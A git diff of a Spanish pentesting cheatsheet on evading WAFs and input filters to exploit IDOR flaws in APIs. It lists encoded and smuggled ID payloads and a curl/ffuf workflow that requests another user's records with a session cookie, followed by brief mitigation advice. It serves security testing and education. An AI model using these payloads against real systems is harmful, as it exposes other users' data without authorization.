@@ -1,17 +1,17 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/technique
   - vuln/idor
   - technique/discovery
   - asset/api
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[BOLA - IDOR]]"
+  - '[[BOLA - IDOR]]'
 ---
 # IDOR - Técnicas de Evasión y Bypass de Filtros
 
@@ -19,32 +19,47 @@ linked:
 
 ## Cheatsheet
 
-| **Técnica**                                                       | **Descripción**                                                                                                                                                                                                                                      | **Payload Original (Ejemplo)**   | **Payload Evasivo (Ejemplo)**                              |
-| ----------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------- | ---------------------------------------------------------- |
-| <br>**Doble Codificación (Double URL Encoding)**                  | <br>Codificar la carga útil dos veces. El WAF decodifica la primera capa y no detecta anomalías, pero el backend decodifica la segunda capa y procesa el ataque.<br><br>                                                                             | <br>`id=106` <br>(o `id=../106`) | <br>`id=%2531%2530%2536`<br>`id=%252e%252e%252f106`        |
-| <br>**Codificación Unicode / Hexadecimal**                        | <br>Representar los caracteres del identificador mediante secuencias de escape Unicode o Hexadecimales, eludiendo filtros basados en expresiones regulares simples.                                                                                  | <br>`{"id": 106}`                | <br>`{"id": "\u0031\u0030\u0036"}`                         |
-| <br>**Inyección de Caracteres Nulos (Null Byte)**                 | <br>Inserción de un byte nulo (`%00`) para engañar a los filtros o funciones de validación (especialmente en C/C++ o PHP antiguo) haciéndoles creer que la cadena ha terminado, mientras el backend procesa el resto.<br><br>                        | <br>`GET /file?name=106.pdf`     | <br>`GET /file?name=106.pdf%00.jpg`                        |
-| <br><br>**Manipulación de Espacios y Saltos de Línea**            | <br>Añadir espacios, tabulaciones (`%09`), retornos de carro (`%0d`) o saltos de línea (`%0a`) antes o después del ID. El WAF puede no reconocer el patrón, pero el backend suele limpiar (_trim_) estos caracteres antes del procesamiento.<br><br> | <br><br>`id=106`                 | <br><br>`id=%20106%0a`                                     |
-| <br>**Ofuscación de Rutas (Path Normalization)**                  | <br>Alteración de la ruta utilizando secuencias de navegación de directorios combinadas con parámetros de matriz u otros separadores (`..;/`) que el proxy ignora pero el servidor web resuelve.<br><br>                                             | <br>`GET /api/users/106`         | <br>`GET /api/users/105/..;/106`<br>`GET /api/./users/106` |
-| <br>**Notación Científica / Representación Numérica Alternativa** | <br>Explotación de la forma en que los diferentes motores analizan los números (Type Juggling). Si se bloquea un entero específico, representarlo como flotante, notación científica o hexadecimal.                                                  | <br>`{"user_id": 106}`           | <br>`{"user_id": 1.06e2}`<br>`{"user_id": 0x6a}`           |
-| <br>**HTTP Parameter Smuggling (HPS)**                            | <br>Abuso de la discrepancia en cómo un proxy y un servidor backend analizan cadenas de consulta malformadas (por ejemplo, usando `;` en lugar de `&`), logrando contrabandear parámetros no autorizados.<br><br>                                    | <br>`?id=105`                    | <br>`?id=105;id=106`                                       |
+| **Payload evasivo** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `id=%2531%2530%2536` | Double URL encoding — `%25` decode → `%31%30%36` → `106` | WAF decode una vez, backend decode dos. |
+| `{"id": "106"}` | Unicode escapes en JSON — bypass regex `\d+` | Parser JSON resuelve escapes post-WAF. |
+| `?name=106.pdf%00.jpg` | Null byte trunca extensión "permitida" | Backend C/PHP legacy con strcmp byte-aware. |
+| `?id=%20106%0a` | Whitespace/newline padding — backend hace `trim()` post-validación | WAF regex strict `^\d+$`. |
+| `GET /api/users/105/..;/106` | Matrix param `..;/` — proxy normaliza distinto que backend | Tomcat/Jetty con path-param parsing. |
+| `GET /api/./users/106` | Path normalization differential | Reverse proxy laxo. |
+| `{"user_id": 1.06e2}` | Notación científica — `1.06e2 == 106` en JS/Python | Backend con type juggling automático. |
+| `{"user_id": 0x6a}` | Hex literal — `0x6a == 106` en parser JSON lax | Edge parsers. |
+| `?id=105;id=106` | Param smuggling con `;` — proxy ignora, backend procesa | Apache vs Tomcat parsing differential. |
+| `?id=106&id=105` (orden invertido) | HPP — algunos parsers usan último valor | Backend Express + bodyParser inconsistente. |
+| `id=106 ` (con espacio trailing) | Type coercion → `int("106 ") = 106` Python | Validación strict `==` falla, conversion lo acepta. |
+| `id=00000106` | Padding numérico — bypass de equality strict | Validación `id !== "106"` falla con `"00000106"`. |
 ^idor-filtros
 
-## Estrategias de Evaluación y Testing
+### Workflow
 
-Para identificar si un sistema es susceptible a estas técnicas durante una evaluación de [[API Security]] o _Pentesting_, la metodología debe enfocarse en la mutación de la entrada:
-- Mapear primero cómo responde el backend ante entradas malformadas sin intentar un _bypass_. Observar si devuelve errores de sintaxis, errores de base de datos o si ignora caracteres específicos.
-- Aplicar fuzzeo (_fuzzing_) sobre los parámetros identificadores utilizando diccionarios de codificaciones alternativas y caracteres de control (espacios, saltos de línea, nulos).
-- Analizar la respuesta del sistema de defensa (por ejemplo, si devuelve un HTTP 403 o resetea la conexión) frente a la respuesta del servidor de aplicaciones (HTTP 500, 200, 404) para identificar dónde se está filtrando la petición.
+```bash
+# 1. Mapear comportamiento del filtro con probes inocuos
+for payload in '106' '106 ' ' 106' '00000106' '0x6a' '1.06e2' '106;'; do
+  RES=$(curl -sI "https://target/api/users/$payload")
+  echo "$payload → $(echo $RES | grep -E '^HTTP/')"
+done
 
-### Principios de Mitigación
+# 2. Double encoding test
+curl -s "https://target/api/users/%2531%2530%2536" \
+  -H 'Cookie: session=USER_A'
 
-La defensa contra el _bypass_ de filtros no consiste en crear reglas de filtrado infinitamente complejas, sino en eliminar la dependencia de estos mecanismos como única línea de defensa:
+# 3. Matrix param bypass
+curl -s "https://target/api/users/105/..;/106" \
+  -H 'Cookie: session=USER_A'
 
-- Implementar [[Defensa en Profundidad]]. Los WAFs y filtros de entrada deben ser considerados controles compensatorios, no soluciones definitivas.
-- Normalizar siempre la entrada de datos (decodificación estandarizada y _type casting_ estricto) antes de realizar cualquier validación o verificación de seguridad en el backend.
-- Rechazar categóricamente cualquier petición que contenga caracteres inesperados o representaciones ambiguas (aplicar validación estricta mediante listas blancas / _Allowlisting_).
-- Basar la autorización exclusivamente en el contexto de sesión criptográficamente seguro (como un [[JWT Attacks]]) y en la verificación explícita de la relación entre el usuario autenticado y el recurso solicitado a nivel del modelo de datos, independientemente de cómo se haya formateado el ID en la petición.
+# 4. HPP variants
+ffuf -w payloads.txt -u "https://target/api?id=105&id=FUZZ" -H 'Cookie: ...'
 
+# 5. Burp Intruder con Hackvertor — múltiples encodings serial
+```
+
+### Mitigación
+
+Normalización pre-validación obligatoria (URL decode + Unicode normalize + type cast strict). Allowlist > blacklist. **Defensa en profundidad** — WAF no debe ser único control, autz a nivel modelo es la verdad.
 
 ***
